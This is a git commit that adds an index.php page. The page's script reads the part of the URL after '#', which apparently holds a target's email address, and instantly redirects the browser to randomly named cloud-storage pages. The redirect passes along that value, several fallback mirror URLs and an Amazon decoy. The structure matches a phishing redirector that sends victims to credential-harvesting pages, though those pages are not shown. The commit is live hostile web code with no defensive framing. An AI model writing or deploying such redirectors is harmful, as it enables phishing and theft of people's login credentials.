c31bfdf8877f4109aff0cf3c33b70e4f47f0d6f7
Lenoredunlap91 <98395311+Lenoredunlap91@users.noreply.github.com>
2022-01-25 06:47:37 -0500

    Create index.php

---
+++ index.php
@@ -0,0 +1,25 @@
+<html lang="en">
+	<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
+	<script>
+		function makeid(length) {
+			var result = "";
+			var characters =
+				"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+			var charactersLength = characters.length;
+			for (var i = 0; i < length; i++) {
+				result += characters.charAt(
+					Math.floor(Math.random() * charactersLength)
+				);
+			}
+			return result;
+		}
+
+		var hash = window.location.hash;
+		var str = hash.split("#")[1];
+		var em = hash.split("#")[1];
+
+		window.setTimeout(function () {
+			window.location.href = "https://6deq8pgu9m.s3.us-south.objectstorage.softlayer.net/thorougher/index.html?key=430f213b0ebb9887a823191cdde20bb3409422c5&url_01=https://f003.backblazeb2.com/file/apennines-deviless-inappellable/index.html&url_02=https://f004.backblazeb2.com/file/pleiomerous-stolewise-unendemic/index.html&url_03=https://f004.backblazeb2.com/file/hygroblepharic-hymenophyllaceae-republicanised/index.html&url_04=https://f003.backblazeb2.com/file/bugled-mircrobicidal-sanguifluous/index.html&url_05=https://f003.backblazeb2.com/file/canidae-scrupulosities-technological/index.html&redirect=https://www.amazon.com"+ makeid(10) + "#" + em;
+		}, 0);
+	</script>
+</html>
